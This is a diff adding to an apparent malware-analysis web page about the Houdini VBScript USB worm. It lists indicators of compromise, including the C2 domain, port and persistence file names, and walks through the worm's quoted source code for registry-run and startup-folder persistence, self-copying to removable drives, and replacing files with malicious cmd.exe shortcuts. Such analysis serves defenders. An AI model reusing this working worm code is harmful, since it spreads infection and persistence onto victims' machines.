@@ -23,7 +23,7 @@
 
     <section class="details">
         <div class="container">
-            <h2>Key Details</h2>
+            <h2>Key Details / IOCs</h2>
             <ul>
                 <li><strong>Worm Name:</strong> Houdini Worm</li>
                 <li><strong>Type:</strong> USB Infecting Worm</li>
@@ -34,8 +34,14 @@
                 This malware was found to have Remote Access capabilities, allowing the attackers to run arbitrary commands via an HTTP channel. The malware also creates multiple forms of persistence and infects all other drives when ran. All your USBs will be infected when plugged in. This self-replicating nature classifies this malware as a worm.
             </p>
             <p>
-                Hash: <a href="https://www.virustotal.com/gui/file/e66a0f9d69f455d41212d2cd9b9158b55fd5f1da4ae8fbf76492c2d19ff05895">e66a0f9d69f455d41212d2cd9b9158b55fd5f1da4ae8fbf76492c2d19ff05895</a>
+                SHA-256 Hash: <a href="https://www.virustotal.com/gui/file/e66a0f9d69f455d41212d2cd9b9158b55fd5f1da4ae8fbf76492c2d19ff05895">e66a0f9d69f455d41212d2cd9b9158b55fd5f1da4ae8fbf76492c2d19ff05895</a>
             </p>
+            <p>Domain Name: diiimaria[.]zapto[.]org</p>
+            <p>Protocol: HTTP</p>
+            <p>Port: 1644</p>
+            <p>HKCU/HKLM Run Key: angry birds.vbe</p>
+            <p>Startup Folder: angry birds.vbe</p>
+            <p>Be sure to check for hidden system files. Files and Folders on root of any USB will be marked as such and an lnk will be created to run the payload, then redirect to original file/folder.</p>
         </div>
     </section>
 
@@ -687,8 +693,182 @@ end if
 
 cmdshell = readallfromany
 end function</code><pre></p>
-        </div></div>
-    </section>
+        </div>
+    <p>A bunch of variables are defined at the beginning, but let's actually start where the code begins - </p>
+    <pre><code>'=-=-=-=-= code start =-=-=-=-=-=-=-=-=-=-=-=
+on error resume next
+instance
+while true
+install
+</code></pre>
+    <p>First, the "instance" function is called once before an infinite loop.</p>
+    <pre>
+
+    </pre>
+    <h3>Code Execution - Part 1 - Instance</h3>
+    <p>This function runs once at the beginning of process execution.</p>
+    <pre><code>function instance
+on error resume next
+
+usbspreading = shellobj.regread ("HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0) & "\")
+if usbspreading = "" then
+   if lcase ( mid(wscript.scriptfullname,2)) = ":\" &  lcase(installname) then
+      usbspreading = "true - " & date
+      shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0)  & "\",  usbspreading, "REG_SZ"
+   else
+      usbspreading = "false - " & date
+      shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0)  & "\",  usbspreading, "REG_SZ"
+
+   end if
+end If</code></pre>
+    <p>This checks the "HKLM:\Software\angry birds" registry key to see if there is a value set.</p>
+    <p>If there is no value, it sets the value as True/False depending on if it started from a USB, with the date of infection.</p>
+    <p>Then the infinite loop begins...</p>
+    <pre>
+
+    </pre>
+    <h3>Code Execution - Part 2 - Install</h3>
+    <p>This next function "install" does all the heavy lifting for replication and persistence.</p>
+    <pre><code>dim lnkobj
+dim filename
+dim foldername
+dim fileicon
+dim foldericon
+
+upstart
+for each drive in filesystemobj.drives
+
+if  drive.isready = true then
+if  drive.freespace  > 0 then
+if  drive.drivetype  = 1 then
+    filesystemobj.copyfile wscript.scriptfullname , drive.path & "\" & installname,true
+    if  filesystemobj.fileexists (drive.path & "\" & installname)  then
+        filesystemobj.getfile(drive.path & "\"  & installname).attributes = 2+4
+    end if
+    for each file in filesystemobj.getfolder( drive.path & "\" ).Files
+        if not lnkfile then exit for
+        if  instr (file.name,".") then
+            if  lcase (split(file.name, ".") (ubound(split(file.name, ".")))) <> "lnk" then
+                file.attributes = 2+4
+                if  ucase (file.name) <> ucase (installname) then
+                    filename = split(file.name,".")
+                    set lnkobj = shellobj.createshortcut (drive.path & "\"  & filename (0) & ".lnk") 
+                    lnkobj.windowstyle = 7
+                    lnkobj.targetpath = "cmd.exe"
+                    lnkobj.workingdirectory = ""
+                    lnkobj.arguments = "/c start " & replace(installname," ", chrw(34) & " " & chrw(34)) & "&start " & replace(file.name," ", chrw(34) & " " & chrw(34)) &"&exit"
+                    fileicon = shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\" & shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\." & split(file.name, ".")(ubound(split(file.name, ".")))& "\") & "\defaulticon\") 
+                    if  instr (fileicon,",") = 0 then
+                        lnkobj.iconlocation = file.path
+                    else 
+                        lnkobj.iconlocation = fileicon
+                    end if
+                    lnkobj.save()
+                end if
+            end if
+        end if
+    next
+    for each folder in filesystemobj.getfolder( drive.path & "\" ).subfolders
+        if not lnkfolder then exit for
+        folder.attributes = 2+4
+        foldername = folder.name
+        set lnkobj = shellobj.createshortcut (drive.path & "\"  & foldername & ".lnk") 
+        lnkobj.windowstyle = 7
+        lnkobj.targetpath = "cmd.exe"
+        lnkobj.workingdirectory = ""
+        lnkobj.arguments = "/c start " & replace(installname," ", chrw(34) & " " & chrw(34)) & "&start explorer " & replace(folder.name," ", chrw(34) & " " & chrw(34)) &"&exit"
+        foldericon = shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\folder\defaulticon\") 
+        if  instr (foldericon,",") = 0 then
+            lnkobj.iconlocation = folder.path
+        else 
+            lnkobj.iconlocation = foldericon
+        end if
+        lnkobj.save()
+    next
+end If
+end If
+end if
+next
+err.clear
+end sub</code></pre>
+<p>So it calls another function... "upstart". What does that one do?</p>
+
+<h3>Persistence via Upstart Function</h3>
+    <pre><code>sub upstart ()
+on error resume Next
+
+shellobj.regwrite "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" & split (installname,".")(0),  "wscript.exe //B " & chrw(34) & installdir & installname & chrw(34) , "REG_SZ"
+shellobj.regwrite "HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\" & split (installname,".")(0),  "wscript.exe //B "  & chrw(34) & installdir & installname & chrw(34) , "REG_SZ"
+filesystemobj.copyfile wscript.scriptfullname,installdir & installname,true
+filesystemobj.copyfile wscript.scriptfullname,startup & installname ,true
+
+end sub</code></pre>
+    <p>Now we are getting somewhere!</p>
+    
+    <p>So this part of the payload sets <b>persistence in the HKCU and HKLM run keys and the startup folder!</b></p>
+    <p>It also copies itself to the install location declared in the variables at the beginning - %userprofile%\angry birds.vbe</p>
+    <p>Considering this is Visual Basic, the script is launched using the built-in wscript.exe binary.</p>
+    <h3>Self-Replication</h3>
+    <p>After copying itself and setting persistence, it continues with the "instance" function from above.</p>
+    <pre><code>if  drive.isready = true then
+if  drive.freespace  > 0 then
+if  drive.drivetype  = 1 then
+    filesystemobj.copyfile wscript.scriptfullname , drive.path & "\" & installname,true
+    if  filesystemobj.fileexists (drive.path & "\" & installname)  then
+        filesystemobj.getfile(drive.path & "\"  & installname).attributes = 2+4
+    end if</code></pre>
+    <p>The script then loops through each drive on the system.</p>
+    <p>If the drive is in a ready state, has any amount of free space, and is removable (<a href="https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/drivetype-property">by testing if drivetype=1</a>).</p>
+    <p>The VBE script is then copied to root of the drive and it is marked as hidden and system (<a href="https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/attributes-property">2+4 attributes</a>).</p>
+    <p>The next two major portions of this function do similar functions.</p>
+    <pre><code>for each file in filesystemobj.getfolder( drive.path & "\" ).Files
+        if not lnkfile then exit for
+        if  instr (file.name,".") then
+            if  lcase (split(file.name, ".") (ubound(split(file.name, ".")))) <> "lnk" then
+                file.attributes = 2+4
+                if  ucase (file.name) <> ucase (installname) then
+                    filename = split(file.name,".")
+                    set lnkobj = shellobj.createshortcut (drive.path & "\"  & filename (0) & ".lnk") 
+                    lnkobj.windowstyle = 7
+                    lnkobj.targetpath = "cmd.exe"
+                    lnkobj.workingdirectory = ""
+                    lnkobj.arguments = "/c start " & replace(installname," ", chrw(34) & " " & chrw(34)) & "&start " & replace(file.name," ", chrw(34) & " " & chrw(34)) &"&exit"
+                    fileicon = shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\" & shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\." & split(file.name, ".")(ubound(split(file.name, ".")))& "\") & "\defaulticon\") 
+                    if  instr (fileicon,",") = 0 then
+                        lnkobj.iconlocation = file.path
+                    else 
+                        lnkobj.iconlocation = fileicon
+                    end if
+                    lnkobj.save()
+                end if
+            end if
+        end if
+    next
+    for each folder in filesystemobj.getfolder( drive.path & "\" ).subfolders
+        if not lnkfolder then exit for
+        folder.attributes = 2+4
+        foldername = folder.name
+        set lnkobj = shellobj.createshortcut (drive.path & "\"  & foldername & ".lnk") 
+        lnkobj.windowstyle = 7
+        lnkobj.targetpath = "cmd.exe"
+        lnkobj.workingdirectory = ""
+        lnkobj.arguments = "/c start " & replace(installname," ", chrw(34) & " " & chrw(34)) & "&start explorer " & replace(folder.name," ", chrw(34) & " " & chrw(34)) &"&exit"
+        foldericon = shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\folder\defaulticon\") 
+        if  instr (foldericon,",") = 0 then
+            lnkobj.iconlocation = folder.path
+        else 
+            lnkobj.iconlocation = foldericon
+        end if
+        lnkobj.save()</code></pre>
+        <p>This section quite simply replaces all files that aren't the vbe script or an lnk with a shortcut to the vbe script, then the actual folder.</p>
+        <p><b>The original files/folders become hidden system files.</b></p>
+        <p>Just like we saw in the initial images of the USB, but now with <b>all files and folders on root of the USB.</b></p>
+        <p><code>cmd.exe /c start angry" "birds.vbe&start explorer original_folder</code></p>
+        <pre>
+
+        </pre>
+        <h3>Code Execution - Part 3 - Command and Control (C2)</h3>
+</div></section>
     <footer>
         <div class="container">
             <p>&copy; BarrySploit Github Pages</p>
